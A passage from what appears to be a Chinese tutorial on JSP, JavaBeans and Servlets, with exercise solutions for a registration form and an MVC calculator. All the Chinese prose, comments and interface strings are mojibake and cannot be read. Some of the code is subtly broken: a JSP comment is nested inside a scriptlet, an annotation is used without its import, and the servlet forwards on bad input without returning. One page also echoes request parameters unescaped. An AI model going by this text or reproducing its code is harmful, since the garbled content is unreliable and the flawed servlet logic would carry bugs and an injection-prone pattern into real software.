request.setCharacterEncoding(\"UTF-8\"); %> <%--è§£å†³ä¸­æ–‡ä¹±ç --%>\n<body>\n<jsp:useBean  id=\"add\" class=\"beans.Add\" scope=\"request\"/>\n\n<jsp:setProperty property=\"shuju1\" name=\"add\"/>\n<jsp:setProperty property=\"shuju2\" name=\"add\"/>\n\n<jsp:getProperty property=\"shuju1\" name=\"add\"/>+\n<jsp:getProperty property=\"shuju2\" name=\"add\"/>=<%=add.sum%>\n```\n\n## JSP&JavaBeanå®ä¾‹ç»ƒä¹ \n\n### ç›®çš„\n\n- 1ï¼æŒæ¡å¸¸ç”¨JSPåŠ¨ä½œå…ƒç´ çš„ä½¿ç”¨ï¼›\n\n- 2ï¼æŒæ¡å¸¸ç”¨å†…ç½®å¯¹è±¡çš„ä½¿ç”¨ï¼›\n\n- 3ï¼æŒæ¡JavaBeançš„åˆ›å»ºå’Œä½¿ç”¨ï¼›\n\n- 4ï¼æŒæ¡ä½¿ç”¨JSPåŠ¨ä½œæŒ‡ä»¤è®¾ç½®beanå±æ€§çš„å‡ ç§æ–¹å¼ï¼›\n\n- 5ï¼æŒæ¡åœ¨å¤šä¸ªJSPé¡µé¢ä¸­å…±äº«JavaBeanã€‚\n\n### é¢˜ç›®\n\n**æ–°å»ºä¸€ä¸ªWebå·¥ç¨‹ï¼Œè®¾è®¡å¦‚å›¾1æ‰€ç¤ºregister.jspæ³¨å†Œç¨‹åºï¼Œè¦æ±‚ç”¨æˆ·å¡«å†™å§“åã€æ€§åˆ«ã€å‡ºç”Ÿå¹´æœˆã€æ°‘æ—ã€ä¸ªäººä»‹ç»ç­‰ä¿¡æ¯ï¼Œæäº¤æ³¨å†Œååœ¨å¦ä¸€ä¸ªjspé¡µé¢ä¸­æ˜¾ç¤ºç”¨æˆ·ä¿¡æ¯ï¼Œå¦‚å›¾2æ‰€ç¤ºã€‚**\n\n>ï¼ˆ1ï¼‰  åˆ›å»ºCSSæ ·å¼æ–‡ä»¶ï¼Œé‡‡ç”¨é“¾æ¥æ–¹å¼ï¼›\n>ï¼ˆ2ï¼‰  ç¼–å†™**output1.jsp**ï¼Œä½¿ç”¨requestå†…ç½®å¯¹è±¡åˆ†åˆ«è·å–å„é¡¹æ³¨å†Œä¿¡æ¯å¹¶æ˜¾ç¤ºã€‚\n>ï¼ˆ3ï¼‰  ç¼–å†™JavaBeanç”¨æˆ·å°è£…æ³¨å†Œä¿¡æ¯ï¼Œå¹¶ç¼–å†™**output2.jsp**ï¼Œä½¿ç”¨`<jsp:setProperty>`å’Œ`<jsp:getProperty>`è·å–æ³¨å†Œä¿¡æ¯å¹¶æ˜¾ç¤ºã€‚\n\n| register.jspæ˜¾ç¤ºæ•ˆæœ                                    | output.jspè¾“å‡ºæ˜¾ç¤ºæ•ˆæœ                                  |\n| ------------------------------------------------------- | ------------------------------------------------------- |\n| ![å›¾1](https://img.jwt1399.top//img/20200817103449.jpg) | ![å›¾2](https://img.jwt1399.top//img/20200817103446.png) |\n\n### è§£ç­”\n\n#### register.jsp\n\n```html\n<%@ page language=\"java\" import=\"java.util.*\" contentType=\"text/html; charset=utf-8\" pageEncoding=\"utf-8\"%>\n<%\nString path = request.getContextPath();\nString basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";\n%>\n\n<!DOCTYPE html>\n<html>\n  <head>\n    <base href=\"<%=basePath%>\">\n\t<meta charset=\"UTF-8\">\n\t<title>ç”¨æˆ·æ³¨å†Œ</title>\n\t<meta http-equiv=\"pragma\" content=\"no-cache\">\n\t<meta http-equiv=\"cache-control\" content=\"no-cache\">\n\t<meta http-equiv=\"expires\" content=\"0\">    \n\t<meta http-equiv=\"keywords\" content=\"keyword1,keyword2,keyword3\">\n\t<meta http-equiv=\"description\" content=\"This is my page\">\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"css/styles.css\">\n  </head>\n    \n  <body>\n    <form action=\"output2.jsp\" name=\"regForm\" method=\"post\">\n      <table border=\"0\" align=\"center\" width=\"600\">\n        <tr> <td colspan=\"3\" height=\"50\" > <p id=\"title\">ç”¨æˆ·æ³¨å†Œ</p></td></tr>\n        <tr> \n          <td width=\"150\" height=\"50\"  class=\"c1\">ç”¨æˆ·å:</td>\n          <td   width=\"200\"  ><input id=\"userName\" type=\"text\" name=\"userName\" value=\"\" placeholder=\"å¼ ä¸‰\" required/></td>\n          <td   class=\"c3\" ><span>ç”¨æˆ·åä¸èƒ½ä¸ºç©ºï¼</span></td>\n        </tr>\n        <tr> \n          <td class=\"c1\" height=\"50\">æ€§åˆ«:</td>\n          <td><input type=\"radio\" name=\"userSex\" value=\"ç”·\" checked style=\"width:30px;\"/>ç”·\n          &nbsp;<input type=\"radio\" name=\"userSex\" value=\"å¥³\" style=\"width:30px;\"/>å¥³</td>\n          <td class=\"c3\">è¯·é€‰æ‹©ä½ çš„æ€§åˆ«ï¼</td>\n        </tr>\n         \n        <tr> \n          <td class=\"c1\" height=\"50\">å‡ºç”Ÿå¹´æœˆ:</td>\n          <td><input type=\"date\" name=\"userBirthday\" value=\"\" /></td>\n          <td class=\"c3\">è¯·é€‰æ‹©ä½ çš„å‡ºç”Ÿæ—¥æœŸï¼</td>\n        </tr>\n        <tr> \n          <td class=\"c1\" height=\"50\">æ°‘æ—:</td>\n          <td><select name=\"userNation\" style=\"width:80px;\">\n          \t\t\t<option value=\"æ±‰æ—\">æ±‰æ—</option>\n                    <option value=\"å£®æ—\">å£®æ—</option>\n                    <option value=\"è‹—æ—\">è‹—æ—</option>\n                    <option value=\"å›æ—\">å›æ—</option>\n              </select>\n          </td>\n          <td class=\"c3\">è¯·é€‰æ‹©ä½ çš„æ°‘æ—ï¼</td>\n        </tr>\n        <tr> \n          <td class=\"c1\" height=\"50\">ä¸ªäººä»‹ç»:</td>\n          <td colspan=\"2\"><textarea cols=\"50\" rows=\"5\" name=\"userInfo\">æˆ‘æ˜¯ä¸€åå•çº¯çš„å¤§å­¦ç”Ÿã€‚ã€‚ã€‚</textarea></td>\n        </tr>\n        <tr>         \n          <td colspan=\"3\" align=\"center\" height=\"40\">\n            <input type=\"submit\" value=\"æ³¨å†Œ\" style=\"width:80px;\"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\n            <input type=\"reset\" value=\"é‡ç½®\" style=\"width:80px;\"/>\n          </td>\n        </tr>\n      </table>    \n    </form>\n  </body>\n</html>\n```\n\n#### style.css\n\n```css\nbody{\n\tfont-size:18px;\n\tcolor:red;\n\t}\n#title{\n\tcolor:#F00;\n\tfont-size:24px;\n\tfont-weight:bolder;\n\ttext-align:center;\n\t}\n.c1{\n\ttext-align:right;\n\t} \n.c3{\n\tcolor:blue; \n\tfont-size:15px;\n\t}\n input{\n\twidth:200px;\n \t}\ninput:hover{\n\tbackground-color:#00F;\n\t}\ninput:focus{\n\tbackground-color:#ccc;\n\t}\n#userName{\n\tbackground-image: url(../images/name.gif);\n\tbackground-repeat: no-repeat;\n\tbackground-position: 5px;\n\tpadding-left: 25px;\n\tborder: 1px solid #ccc;\n }\n```\n\n#### output1.jsp\n\n```html\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"utf-8\"%>\n<%-- <%@ page import=\"beans.Student\" %> --%>\n<%\nString path = request.getContextPath();\nString basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";\n%>\n\n<!DOCTYPE html>\n<html>\n  <head>\n    <base href=\"<%=basePath%>\">\n    <title>My JSP 'output.jsp' starting page</title>\n\t<meta http-equiv=\"pragma\" content=\"no-cache\">\n\t<meta http-equiv=\"cache-control\" content=\"no-cache\">\n\t<meta http-equiv=\"expires\" content=\"0\">    \n\t<meta http-equiv=\"keywords\" content=\"keyword1,keyword2,keyword3\">\n\t<meta http-equiv=\"description\" content=\"This is my page\">\n  </head>\n  \n  <body>\n  \t<%  request.setCharacterEncoding(\"UTF-8\");<%--è§£å†³ä¸­æ–‡ä¹±ç --%>\n\t\tString userName = request.getParameter(\"userName\");\n\t\tString userSex = request.getParameter(\"userSex\");\n\t\tString userBirthday = request.getParameter(\"userBirthday\");\n\t\tString userNation = request.getParameter(\"userNation\");\n\t\tString userInfo = request.getParameter(\"userInfo\");\n\t%>\n\n    <table border=\"0\" align=\"center\" width=\"400\">\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\">å§“åï¼š</td>\n    \t\t<td><%=userName %></td>\n    \t</tr>\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\">æ€§åˆ«ï¼š</td>\n    \t\t<td><%=userSex %></td>\n    \t</tr>\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\">ç”Ÿæ—¥ï¼š</td>\n    \t\t<td><%=userBirthday %></td>\n    \t</tr>\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\">æ°‘æ—ï¼š</td>\n    \t\t<td><%=userNation %></td>\n    \t</tr>\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\" valign=\"top\">ä¸ªäººä»‹ç»ï¼š</td>\n    \t\t<td height=\"100\" valign=\"top\"><%=userInfo %></td>\n    \t</tr>\n    </table>\n  </body>\n</html>\n\n```\n\n#### User.java\n\n```java\npackage beans;\n\npublic class User {\n\tprivate String userName;\n\tprivate String userSex;\n\tprivate String userBirthday;\n\tprivate String userNation;\n\tprivate String userInfo;\n\t\n\tpublic User(){\n\t\t\n\t}\n\t\n\tpublic User(String userName, String userSex, String userBirthday,\n\t\t\tString userNation, String userInfo) {\n\t\tsuper();\n\t\tthis.userName = userName;\n\t\tthis.userSex = userSex;\n\t\tthis.userBirthday = userBirthday;\n\t\tthis.userNation = userNation;\n\t\tthis.userInfo = userInfo;\n\t}\n\t\n\t\n\tpublic void setUserName(String userName) {\n\t\tthis.userName = userName;\n\t}\n\t\n\tpublic void setUserSex(String userSex) {\n\t\tthis.userSex = userSex;\n\t}\n\t\n\tpublic void setUserBirthday(String userBirthday) {\n\t\tthis.userBirthday = userBirthday;\n\t}\n\t\n\tpublic void setUserNation(String userNation) {\n\t\tthis.userNation = userNation;\n\t}\n\t\n\tpublic void setUserInfo(String userInfo) {\n\t\tthis.userInfo = userInfo;\n\t}\n\t\n\tpublic String getUserName() {\n\t\treturn userName;\n\t}\n\tpublic String getUserSex(){\n\t\treturn userSex;\n\t}\n\tpublic String getUserBirthday() {\n\t\treturn userBirthday;\n\t}\n\tpublic String getUserNation() {\n\t\treturn userNation;\n\t}\n\tpublic String getUserInfo() {\n\t\treturn userInfo;\n\t}\n}\n\n```\n\n#### output2.jsp\n\n```html\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"utf-8\"%>\n<%@ page import=\"beans.User\" %>\n<%\n\tString path = request.getContextPath();\nString basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";\n%>\n\n<!DOCTYPE html>\n<html>\n  <head>\n    <base href=\"<%=basePath%>\">\n    <title>Output</title>\n\t<meta http-equiv=\"pragma\" content=\"no-cache\">\n\t<meta http-equiv=\"cache-control\" content=\"no-cache\">\n\t<meta http-equiv=\"expires\" content=\"0\">    \n\t<meta http-equiv=\"keywords\" content=\"keyword1,keyword2,keyword3\">\n\t<meta http-equiv=\"description\" content=\"This is my page\">\n  </head>\n  \n  <body>\n  \t<% request.setCharacterEncoding(\"UTF-8\"); %>\n  \t<jsp:useBean id=\"user\" class=\"beans.User\" scope=\"request\"/>\n  \t<jsp:setProperty name=\"user\" property=\"*\"/>\n\n    <table border=\"0\" align=\"center\" width=\"400\">\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\">å§“åï¼š</td>\n    \t\t<td><jsp:getProperty name=\"user\" property=\"userName\"/></td>\n    \t</tr>\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\">æ€§åˆ«ï¼š</td>\n    \t\t<td><jsp:getProperty name=\"user\" property=\"userSex\"/></td>\n    \t</tr>\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\">ç”Ÿæ—¥ï¼š</td>\n    \t\t<td><jsp:getProperty name=\"user\" property=\"userBirthday\"/></td>\n    \t</tr>\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\">æ°‘æ—ï¼š</td>\n    \t\t<td><jsp:getProperty name=\"user\" property=\"userNation\"/></td>\n    \t</tr>\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\" valign=\"top\">ä¸ªäººä»‹ç»ï¼š</td>\n    \t\t<td height=\"100\" valign=\"top\"><jsp:getProperty name=\"user\" property=\"userInfo\"/></td>\n    \t</tr>\n    </table>\n  </body>\n</html>\n```\n\n## ServletæŠ€æœ¯\n\nåœ¨Webåº”ç”¨ç¨‹åºå¼€å‘ä¸­ï¼Œä¸€èˆ¬ç”±JSPæŠ€æœ¯ã€JavaBeanæŠ€æœ¯å’ŒServletæŠ€æœ¯çš„ç»“åˆå®ç°MVCå¼€å‘æ¨¡å¼ã€‚\n\n   åœ¨MVCå¼€å‘æ¨¡å¼ä¸­ï¼Œå°†Webç¨‹åºçš„ç»„ä»¶åˆ†ä¸º3éƒ¨åˆ†ï¼šè§†å›¾ã€æ§åˆ¶ã€ä¸šåŠ¡ï¼Œåˆ†åˆ«ç”±JSPã€Servletå’ŒJavaBeanå®ç°ã€‚\n\n### Servletç”Ÿå‘½å‘¨æœŸ\n\n> Servletä½œä¸ºä¸€ç§åœ¨Servletå®¹å™¨ä¸­è¿è¡Œçš„ç»„ä»¶ï¼Œå¿…ç„¶æœ‰ä¸€ä¸ªä»åˆ›å»ºåˆ°é”€æ¯çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºServletçš„ç”Ÿå‘½å‘¨æœŸã€‚\n\nServletçš„ç”Ÿå‘½å‘¨æœŸå¯ä»¥åˆ’åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªé˜¶æ®µï¼š\n\n1.åŠ è½½å’Œå®ä¾‹åŒ–\n\n2.åˆå§‹åŒ–\n\n3.å“åº”è¯·æ±‚\n\n4.æœåŠ¡ç»ˆæ­¢\n\n![](https://img.jwt1399.top//img/20200614193513.png)\n\n### ServletåŸºæœ¬ç»“æ„\n\n![](https://img.jwt1399.top//img/20200614193738.png)\n\n**è¯´æ˜ï¼š**\n\nâ‘ Servletç±»éœ€è¦ç»§æ‰¿ç±»HttpServlet\n\nâ‘¡Servletçš„çˆ¶ç±»HttpServletä¸­åŒ…å«äº†å‡ ä¸ªé‡è¦æ–¹æ³•ï¼Œæ ¹æ®éœ€è¦é‡å†™å®ƒä»¬ï¼š\n\n- init()ï¼šåˆå§‹åŒ–æ–¹æ³•ï¼ŒServletå¯¹è±¡åˆ›å»ºåï¼Œæ¥ç€æ‰§è¡Œè¯¥æ–¹æ³•ã€‚\n\n- doGet()ï¼šå½“è¯·æ±‚ç±»å‹æ˜¯\"get\"æ—¶ï¼Œè°ƒç”¨è¯¥æ–¹æ³•ã€‚\n\n- doPost()ï¼šå½“è¯·æ±‚ç±»å‹æ˜¯\"post\"æ—¶ï¼Œè°ƒç”¨è¯¥æ–¹æ³•ã€‚\n\n- service()ï¼šServletå¤„ç†è¯·æ±‚æ—¶è‡ªåŠ¨æ‰§è¡Œservice()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ ¹æ®è¯·æ±‚çš„ç±»å‹ï¼ˆgetæˆ–postï¼‰ï¼Œè°ƒç”¨doGet()æˆ–doPost()æ–¹æ³•ï¼Œå› æ­¤ï¼Œåœ¨å»ºç«‹Servletæ—¶ï¼Œä¸€èˆ¬åªéœ€è¦é‡å†™doGet()å’ŒdoPost()æ–¹æ³•ã€‚\n\n- destroy()ï¼šServletå¯¹è±¡æ³¨é”€æ—¶è‡ªåŠ¨æ‰§è¡Œã€‚\n\n### Servletå»ºç«‹æ­¥éª¤\n\n**Step1ï¼š**å»ºç«‹Webå·¥ç¨‹\n\n**Step2ï¼š**å»ºç«‹Servlet\n\n- â‘ åœ¨é¡¹ç›®srcä¸‹åˆ›å»ºã€‚\n\n- â‘¡é‡å†™Servletçš„doGetæˆ–doPostæ–¹æ³•ã€‚\n\n- â‘¢ä¿®æ”¹web.xmlé…ç½®æ–‡ä»¶ï¼Œæ³¨å†Œæ‰€è®¾è®¡çš„Servletã€‚\n\n**Step3ï¼š**éƒ¨ç½²å¹¶è¿è¡ŒServlet\n\n### Servleté…ç½®\n\nç”±äºå®¢æˆ·ç«¯æ˜¯é€šè¿‡URLåœ°å€è®¿é—®webæœåŠ¡å™¨ä¸­çš„èµ„æºï¼Œæ‰€ä»¥Servletç¨‹åºè‹¥æƒ³è¢«å¤–ç•Œè®¿é—®ï¼Œå¿…é¡»æŠŠservletç¨‹åºæ˜ å°„åˆ°ä¸€ä¸ªURLåœ°å€ä¸Šï¼Œè¿™ä¸ªå·¥ä½œåœ¨web.xmlæ–‡ä»¶ä¸­ä½¿ç”¨`<servlet>`å…ƒç´ å’Œ`<servlet-mapping>`å…ƒç´ å®Œæˆã€‚\n\n#### `<servlet>`å…ƒç´ \n\nç”¨äºæ³¨å†ŒServletï¼Œå®ƒåŒ…å«æœ‰ä¸¤ä¸ªä¸»è¦çš„å­å…ƒç´ ï¼š`<servlet-name>`å’Œ`<servlet-class>`ï¼Œåˆ†åˆ«ç”¨äºè®¾ç½®Servletçš„æ³¨å†Œåç§°å’ŒServletçš„å®Œæ•´ç±»åã€‚\n\n```html\n<servlet>    \n    <servlet-name>LoginCheckServlet</servlet-name>\n    <servlet-class>servlets.LoginCheckServlet</servlet-class>\n  </servlet>\n```\n\n#### `<servlet-mapping>`å…ƒç´ \n\nç”¨äºæ˜ å°„ä¸€ä¸ªå·²æ³¨å†Œçš„Servletçš„ä¸€ä¸ªå¯¹å¤–è®¿é—®è·¯å¾„ï¼Œå®ƒåŒ…å«æœ‰ä¸¤ä¸ªå­å…ƒç´ ï¼š`<servlet-name>`å’Œ`<url-pattern>`ï¼Œåˆ†åˆ«ç”¨äºæŒ‡å®šServletçš„æ³¨å†Œåç§°å’ŒServletçš„å¯¹å¤–è®¿é—®è·¯å¾„ã€‚\n\n```html\n<servlet-mapping>\n    <servlet-name>LoginCheckServlet</servlet-name>\n    <url-pattern>/loginCheck</url-pattern>\n  </servlet-mapping>\n```\n\næ³¨æ„ï¼š\n\n1ã€ä¸€ä¸ª`<servlet>`å¯ä»¥å¯¹åº”å¤šä¸ª`<serlvet-mapping>`,ä»è€Œä¸€ä¸ªServletå¯ä»¥æœ‰å¤šä¸ªè·¯å¾„æ¥è®¿é—®\n\n2ã€url-parttenä¸­çš„è·¯å¾„ä¹Ÿå¯ä»¥ä½¿ç”¨*é€šé…ç¬¦ï¼Œä½†æ˜¯åªèƒ½æœ‰ä¸¤ç§å›ºå®šçš„æ ¼å¼ï¼šä¸€ç§æ ¼å¼æ˜¯â€œ*.æ‰©å±•åâ€ï¼Œå¦ä¸€ç§æ ¼å¼æ˜¯ä»¥æ­£æ–œæ ï¼ˆ/ï¼‰å¼€å¤´å¹¶ä»¥â€œ/*â€ç»“å°¾ã€‚\n\n## Servletå®ä¾‹ç»ƒä¹ \n\n### ç›®çš„\n\n- 1ï¼æŒæ¡servletçš„åˆ›å»ºã€é…ç½®å’Œè®¿é—®ï¼›\n\n- 2ï¼ç†è§£servletçš„åŸºæœ¬ç»“æ„ã€å¸¸ç”¨æ–¹æ³•ã€æ‰§è¡Œè¿‡ç¨‹å’Œç”Ÿå‘½å‘¨æœŸï¼›\n\n- 3ï¼æŒæ¡servletä¸­ä½¿ç”¨JSPå†…ç½®å¯¹è±¡å’ŒJavaBeanï¼› \n\n- 4ï¼æŒæ¡JSPä¸servletçš„æ•°æ®å…±äº«å’Œå…³è”å…³ç³»ã€‚\n\n### é¢˜ç›®\n\n**æ–°å»ºä¸€ä¸ªWebå·¥ç¨‹ï¼Œè®¾è®¡å®ç°ä»»æ„ä¸¤ä¸ªå®æ•°å››åˆ™è¿ç®—ï¼ˆåŠ å‡ä¹˜é™¤ï¼‰çš„Webåº”ç”¨ç¨‹åºï¼Œè¦æ±‚ä½¿ç”¨MVCï¼ˆModel-View-Controllerï¼‰è®¾è®¡æ¨¡å¼ã€‚å…·ä½“åœ°ï¼Œä½¿ç”¨JavaBeanå°è£…æ•°æ®å’Œå››åˆ™è¿ç®—æ–¹æ³•ï¼ˆModelï¼Œä¸šåŠ¡ï¼‰ï¼Œç”¨æˆ·é€šè¿‡JSPé¡µé¢è¾“å…¥è®¡ç®—å‚æ•°ï¼ˆViewï¼Œè§†å›¾ï¼‰åæäº¤ç»™Servletç¨‹åºå¤„ç†ï¼ˆControllerï¼Œæµç¨‹æ§åˆ¶ï¼‰ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥æ•°æ®ä¸å®Œæ•´ï¼ˆå¦‚åªè¾“å…¥ä¸€ä¸ªï¼‰åˆ™è·³è½¬åˆ°åŸJSPè¾“å…¥é¡µé¢ï¼Œå¹¶ä»¥æ–‡æœ¬å½¢å¼æç¤ºç”¨æˆ·å¡«å†™å®Œæ•´ï¼Œå¦åˆ™Servletä½¿ç”¨JavaBeanå¯¹æ•°æ®è¿›è¡Œå¤„ç†åè·³è½¬åˆ°JSPé¡µé¢ä½¿ç”¨JavaBeanç›¸å…³çš„jspåŠ¨ä½œæŒ‡ä»¤æ˜¾ç¤ºè®¡ç®—ç»“æœ**\n\n> ï¼ˆ1ï¼‰  ç¼–å†™`input.jsp`ï¼Œæä¾›ç”¨æˆ·è¾“å…¥å…¥å£ï¼Œå¦‚å›¾1æ‰€ç¤ºï¼›\n> ï¼ˆ2ï¼‰  ç¼–å†™`Calculator.java`, è¯¥JavaBeanç±»å°è£…æ“ä½œæ•°å’Œå››åˆ™è¿ç®—æ–¹æ³•ï¼Œ\n> ï¼ˆ3ï¼‰  ç¼–å†™`CalcServlet.java`ï¼Œè¯¥Servletæ¥æ”¶ç”¨æˆ·æäº¤çš„æ•°æ®ä¹‹åï¼Œå½“ä½¿ç”¨é™¤æ³•è¿ç®—æ—¶ï¼Œæ£€éªŒé™¤æ•°æ˜¯å¦ä¸º0ï¼Œè‹¥ä¸º0è·³è½¬åˆ°input.jspï¼Œæé†’ç”¨æˆ·é™¤æ•°ä¸èƒ½ä¸º0ï¼Œå¦‚å›¾2æ‰€ç¤ºï¼›å¦åˆ™ï¼Œä½¿ç”¨JavaBeanå¯¹è±¡è¿ç®—å’Œå°è£…æ•°æ®ï¼Œç„¶åè·³è½¬åˆ°è¾“å‡ºé¡µé¢æ˜¾ç¤ºï¼›\n> ï¼ˆ4ï¼‰  ç¼–å†™`output.jsp`ï¼Œæ¥æ”¶Servletçš„æ•°æ®ï¼Œå¹¶ä½¿ç”¨JavaBeanç›¸å…³åŠ¨ä½œæŒ‡ä»¤è·å¾—å’Œæ˜¾ç¤ºè®¡ç®—ç»“æœï¼Œå¦‚å›¾3æ‰€ç¤ºã€‚\n\n| input.jspæ˜¾ç¤ºæ•ˆæœ              | ![å›¾1](https://img.jwt1399.top//img/20200817123551.jpg) |\n| ------------------------------ | ------------------------------------------------------- |\n| **é™¤æ•°ä¸º0æ—¶input.jspæ˜¾ç¤ºæ•ˆæœ** | ![å›¾2](https://img.jwt1399.top//img/20200817123610.jpg) |\n| **output.jspæ˜¾ç¤ºè®¡ç®—ç»“æœ**     | ![å›¾3](https://img.jwt1399.top//img/20200817123617.jpg) |\n\n### è§£ç­”\n\n#### input.jsp\n\n```html\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"UTF-8\"%>\n<%\nString path = request.getContextPath();\nString basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";\n%>\n\n<!DOCTYPE HTML>\n<html>\n  <head>\n    <base href=\"<%=basePath%>\">\n    <title>è®¡ç®—å™¨</title>\n\t<style type=\"text/css\">\n\t\tdiv{\n\t\t\twidth:80%;\n\t\t\theight:32px;\n\t\t\tmargin:0 auto;\n\t\t\tpadding-left:20px;\n\t\t\tborder:2px solid gray;\n\t\t\tfont-size:18px;\n\t\t\ttext-align:center;\n\t\t}\n\t</style>\n  </head>\n  \n  <body>\n    <div>\n    \t<form name=\"clcForm\" action=\"calcservlet\" method=\"post\">\n\t    \tæ“ä½œæ•°ï¼š<input type=\"number\" name=\"number1\" min=\"-100\" max=\"100\"/> &nbsp;&nbsp;\n\t    \tæ“ä½œç¬¦ï¼š<select name=\"oper\">\n\t    \t\t\t\t\t<option>+</option>\n\t    \t\t\t\t\t<option>-</option>\n\t    \t\t\t\t\t<option>*</option>\n\t    \t\t\t\t\t<option selected>/</option>\n\t    \t\t\t</select> &nbsp;&nbsp;\n\t    \tæ“ä½œæ•°ï¼š<input type=\"number\" name=\"number2\" min=\"-100\" max=\"100\"/>&nbsp;&nbsp;&nbsp;&nbsp;\n\t    \t<input type=\"submit\" value=\"è®¡ç®—\" />&nbsp;&nbsp;\n\t    \t<input type=\"reset\" value=\"é‡ç½®\"/>\n    \t</form>\n    </div>\n    <%String info = (String)request.getAttribute(\"info\");\n     if(info!=null){\n    %>\n    <div style=\"color:red;border:none;\"><%=info %></div>\n    <%} %>\n  </body>\n</html>\n```\n\n#### Calculator.java\n\n```java\npackage beans;\n\npublic class Calculator {\n\tprivate double number1;\n\tprivate double number2;\n\tprivate String oper;\n\t\n\tprivate double result;\n\t\n\tpublic Calculator() {\n\t\tsuper();\n\t}\n\t\n\t\n\tpublic Calculator(double number1, double number2, String oper) {\n\t\tsuper();\n\t\tthis.number1 = number1;\n\t\tthis.number2 = number2;\n\t\tthis.oper = oper;\n\t}\n\tpublic double getResult() {\n\t\tswitch (oper.charAt(0)) {\n\t\tcase '+': result = number1 + number2; \n\t\t\tbreak;\n\t\tcase '-': result = number1 - number2; \n\t\t\tbreak;\n\t\tcase '*': result = number1 * number2; \n\t\t\tbreak;\n\t\tcase '/': result = number1 / number2; \n\t\t\tbreak;\n\t\tdefault:\n\t\t\tbreak;\n\t\t}\n\t\treturn result;\n\t}\n\t/*public void setResult(double result) {\n\t\tthis.result = result;\n\t}*/\n\t\n\tpublic double getNumber1() {\n\t\treturn number1;\n\t}\n\tpublic void setNumber1(double number1) {\n\t\tthis.number1 = number1;\n\t}\n\tpublic double getNumber2() {\n\t\treturn number2;\n\t}\n\tpublic void setNumber2(double number2) {\n\t\tthis.number2 = number2;\n\t}\n\tpublic String getOper() {\n\t\treturn oper;\n\t}\n\tpublic void setOper(String oper) {\n\t\tthis.oper = oper;\n\t}\n\t\n}\n```\n\n#### CalcServlet.java\n\n```java\npackage servlets;\n\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport beans.Calculator;\n@WebServlet(\"/CalcServlet\")\npublic class CalcServlet extends HttpServlet {\n\n\t/**\n\t * Constructor of the object.\n\t */\n\tpublic CalcServlet() {\n\t\tsuper();\n\t}\n\n\t/**\n\t * Destruction of the servlet. <br>\n\t */\n\tpublic void destroy() {\n\t\tsuper.destroy(); // Just puts \"destroy\" string in log\n\t\t// Put your code here\n\t}\n\n\tpublic void doGet(HttpServletRequest request, HttpServletResponse response)\n\t\t\tthrows ServletException, IOException {\n\n\t\tdoPost(request, response);\n\t}\n\n\tpublic void doPost(HttpServletRequest request, HttpServletResponse response)\n\t\t\tthrows ServletException, IOException {\n\t\t\n\t\trequest.setCharacterEncoding(\"UTF-8\");\n\t\tString str1 = request.getParameter(\"number1\").trim();\n\t\tString str2 = request.getParameter(\"number2\").trim();\n\t\tString oper = request.getParameter(\"oper\");\n\t\t\n\t\tif(\"\".equals(str1)||\"\".equals(str2)){//ä¸æ˜¯ str1==null||str2==null\n\t\t\trequest.setAttribute(\"info\", \"è¯·è¾“å…¥ä¸¤ä¸ªæ“ä½œæ•°ï¼\");\n\t\t\trequest.getRequestDispatcher(\"/input.jsp\").forward(request, response);\n\t\t}\n\t\t\n\t\tdouble number1 = Double.parseDouble(str1);\n\t\tdouble number2 = Double.parseDouble(str2);\n\t\t\n\t\tif(\"/\".equals(oper)&&number2==0){\n\t\t\trequest.setAttribute(\"info\", \"é™¤æ•°ä¸èƒ½ä¸º0ï¼\");\n\t\t\trequest.getRequestDispatcher(\"/input.jsp\").forward(request, response);\n\t\t}\n\t\t\n\t\tCalculator calculator = new Calculator(number1,number2,oper);\n\t\trequest.setAttribute(\"calc\", calculator);\n\t\trequest.getRequestDispatcher(\"/output.jsp\").forward(request, response);\n\t}\n\n\tpublic void init() throws ServletException {\n\t\t// Put your code here\n\t}\n\n}\n```\n\n#### output.jsp\n\n```html\n<%@ page language=\"java\" import=\"java.util.*,beans.Calculator\" pageEncoding=\"UTF-8\"%>\n<%\nString path = request.getContextPath();\nString basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";\n%>\n\n<!DOCTYPE HTML>\n<html>\n  <head>\n    <base href=\"<%=basePath%>\">  \n    <title>My JSP 'output.jsp' starting page</title>\n  </head>\n  \n  <body>\n  <jsp:useBean id=\"calc\" class=\"beans.Calculator\" scope=\"request\"></jsp:useBean>\n  <%-- <jsp:setProperty property=\"*\" name=\"calc\"/> --%>\n  \n  <table border=\"0\" align=\"center\" width=\"600\">\n    \t<tr>\n    \t\t<td width=\"100\" align=\"center\"><jsp:getProperty name=\"calc\" property=\"number1\"/></td>\n    \t\t<td width=\"100\" align=\"center\"><jsp:getProperty name=\"calc\" property=\"oper\"/></td>\n    \t\t<td width=\"100\" align=\"center\"><jsp:getProperty name=\"calc\" property=\"number2\"/></td>\n    \t\t<td width=\"100\" align=\"center\">=</td>\n    \t\t<td width=\"100\" 